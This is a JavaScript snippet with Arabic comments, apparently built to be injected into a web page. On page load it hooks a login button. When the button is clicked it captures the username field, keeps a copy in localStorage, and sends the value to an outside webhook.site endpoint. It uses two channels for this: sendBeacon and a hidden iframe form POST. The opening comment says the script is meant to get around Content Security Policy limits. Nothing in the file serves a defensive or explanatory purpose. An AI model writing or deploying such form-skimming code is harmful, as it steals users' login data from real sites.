// سكريبت لإرسال البيانات بطريقة تتجاوز قيود CSP
document.addEventListener('DOMContentLoaded', function() {
  // البحث عن زر تسجيل الدخول
  var loginButton = document.getElementById('loginBtn2');
  
  if (loginButton) {
    console.log('تم العثور على زر تسجيل الدخول');
    
    // إضافة مستمع حدث للزر
    loginButton.addEventListener('click', function() {
      // البحث عن حقل اسم المستخدم
      var usernameField = document.getElementById('username2');
      
      if (usernameField && usernameField.value) {
        var username = usernameField.value;
        
        console.log('تم جمع اسم المستخدم: ' + username);
        
        // حفظ البيانات في localStorage
        try {
          localStorage.setItem('captured_username', username);
          localStorage.setItem('capture_time', new Date().toString());
          console.log('تم حفظ البيانات في localStorage');
        } catch (e) {
          console.log('خطأ في حفظ البيانات في localStorage: ' + e);
        }
        
        // محاولة إرسال البيانات باستخدام navigator.sendBeacon إذا كان متاحًا
        if (navigator.sendBeacon) {
          try {
            var data = new FormData();
            data.append('username', username);
            data.append('timestamp', new Date().toISOString());
            data.append('source', 'beacon');
            
            var beaconSuccess = navigator.sendBeacon('https://webhook.site/93393684-887f-44cd-ba20-11cd87c823ce', data);
            console.log('نتيجة إرسال البيانات باستخدام sendBeacon: ' + beaconSuccess);
          } catch (e) {
            console.log('خطأ في إرسال البيانات باستخدام sendBeacon: ' + e);
          }
        }
        
        // إنشاء عنصر iframe مخفي
        try {
          var iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          
          // إنشاء نموذج داخل الـ iframe
          var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
          var form = iframeDoc.createElement('form');
          form.method = 'POST';
          form.action = 'https://webhook.site/93393684-887f-44cd-ba20-11cd87c823ce';
          
          // إضافة حقل للبيانات
          var input = iframeDoc.createElement('input');
          input.type = 'hidden';
          input.name = 'username';
          input.value = username;
          form.appendChild(input);
          
          // إضافة النموذج إلى الـ iframe وإرساله
          iframeDoc.body.appendChild(form);
          form.submit();
          
          console.log('تم إرسال البيانات باستخدام iframe');
          
          // إزالة الـ iframe بعد فترة
          setTimeout(function() {
            document.body.removeChild(iframe);
          }, 5000);
        } catch (e) {
          console.log('خطأ في إرسال البيانات باستخدام iframe: ' + e);
        }
      } else {
        console.log('لم يتم العثور على حقل اسم المستخدم أو الحقل فارغ');
      }
    });
  } else {
    console.log('لم يتم العثور على زر تسجيل الدخول');
  }
});
